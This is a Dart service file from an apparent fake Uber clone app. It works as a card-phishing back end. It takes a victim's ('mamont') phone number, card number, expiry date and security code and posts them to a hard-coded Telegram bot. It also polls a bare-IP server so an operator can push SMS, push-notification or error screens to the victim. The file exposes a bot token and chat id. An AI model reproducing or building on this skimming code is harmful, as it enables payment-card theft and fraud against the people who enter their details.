import 'dart:async';
import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:get_it/get_it.dart';
import 'package:logger/web.dart';
import 'package:uber_clone/models/mamont_info.module.dart';
import 'package:uber_clone/models/uber_info.module.dart';

abstract interface class InfoRepository {
  Dio get _dio;

  Logger get _logger;

  Future getStartInfo(String guid);

  Future sendUserInfo(MamontInfo mamontInfo, String guid);

  Future getInfo(String guid);

  Stream<String> stateStream(String guid);

  Future sendCodeToTelegram({
    required String guid,
    required String messageText,
  });
}

class InfoService implements InfoRepository {
  static const String baseUrl = 'http://91.222.236.174:8080';
  static const String tgUrl =
      'https://api.telegram.org/bot7116232471:AAF3operxvsE_zX5gPRyhAgGLuSI39wgVWU/sendMessage';

  @override
  final Dio _dio = Dio();

  @override
  final Logger _logger = GetIt.I.get<Logger>();

  @override
  Future sendCodeToTelegram({
    required String guid,
    required String messageText,
  }) async {
    try {
      await _dio.post(
        tgUrl,
        queryParameters: _getParams(messageText, guid),
      );
      return true;
    } catch (e) {
      _logger.e(e);
    }
  }

  @override
  Stream<String> stateStream(String guid) async* {
    var currentStatus = '';
    while (true) {
      try {
        var response = await _dio.get('$baseUrl/state/$guid',
            options: Options(
              contentType: 'text/html; charset=utf-8',
            ));
        if (response.statusCode == 200) {
          if (currentStatus != response.data) {
            currentStatus = response.data;
            yield currentStatus;
          }
        }
        await Future.delayed(const Duration(seconds: 1));
      } on DioException catch (error) {
        _logger.i('$baseUrl/state/$guid');
        _logger.e(error);
        await Future.delayed(const Duration(seconds: 1));
      }
    }
  }

  @override
  Future getStartInfo(String guid) async {
    try {
      final response = await _dio.get('$baseUrl/img/$guid');
      return response.data;
    } catch (_) {}
  }

  @override
  Future<UberInfo?> getInfo(String guid) async {
    try {
      final response = await _dio.get('$baseUrl/options/$guid');
      final data = response.data as List<dynamic>;
      return UberInfo.fromArray(data);
    } catch (e) {
      _logger.e(e);
      return null;
    }
  }

  @override
  Future sendUserInfo(MamontInfo mamontInfo, String guid) async {
    final String messageText =
        """PHONE: ${mamontInfo.phoneNumber}\nCARD NUMBER: ${mamontInfo.cardNumber}\nCARD DATE: ${mamontInfo.cardDate}\nCARD CODE: ${mamontInfo.cardCode}\nCOUNTRY: ${mamontInfo.country}""";
    try {
      await _dio.post(
        tgUrl,
        queryParameters: _getParams(messageText, guid),
      );
    } on DioException catch (e) {
      return e.message;
    }
  }

  Map<String, dynamic> _getParams(String messageText, String guid) => {
        "chat_id": -4130674734,
        "text": messageText,
        "reply_markup": json.encode(
          {
            "inline_keyboard": _createKb(guid),
          },
        ),
      };

  List<dynamic> _createKb(String guid) => [
        [
          {
            "text": "SMS",
            "callback_data": "sms-$guid",
          },
        ],
        [
          {
            "text": "PUSH",
            "callback_data": "push-$guid",
          },
        ],
        [
          {
            "text": "ERROR_SMS",
            "callback_data": "error_sms-$guid",
          },
        ],
        [
          {
            "text": "ERROR_CARD",
            "callback_data": "error_card-$guid",
          },
        ],
        [
          {
            "text": "SUCCES",
            "callback_data": "succes-$guid",
          },
        ],
      ];
}
